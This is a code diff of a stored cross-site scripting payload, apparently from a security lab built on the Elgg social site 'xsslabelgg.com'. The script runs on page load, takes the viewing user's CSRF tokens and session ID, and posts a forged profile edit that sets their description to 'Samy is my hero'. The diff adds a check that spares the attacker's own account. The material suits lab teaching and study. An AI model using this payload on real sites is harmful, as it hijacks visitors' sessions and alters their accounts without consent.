@@ -1,6 +1,5 @@
 <script type="text/javascript">
   window.onload = function () {
-    var Ajax=null;
     var elgg_ts ="&__elgg_ts=" + elgg.security.token.__elgg_ts;
     var elgg_token ="&__elgg_token=" + elgg.security.token.__elgg_token;
     var guid = "&guid=" + elgg.session.user.guid;
@@ -8,11 +7,15 @@
     var desc = "&description=Samy is my hero" + "&accesslevel[description]=2";
     var content = elgg_token + elgg_ts + name + desc + guid;
     // 更新个人资料的url
-    var sendurl= "http://www.xsslabelgg.com/action/profile/edit"; 
+    var sendurl= "http://www.xsslabelgg.com/action/profile/edit";
     
-    Ajax = new XMLHttpRequest();
-    Ajax.open("POST", sendurl, true);
-    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
-    Ajax.send(content);
+    // Samy的guid为47
+    if(elgg.session.user.guid != 47){
+      var Ajax = null;
+      Ajax = new XMLHttpRequest();
+      Ajax.open("POST", sendurl, true);
+      Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+      Ajax.send(content);
+    } 
   } 
 </script>
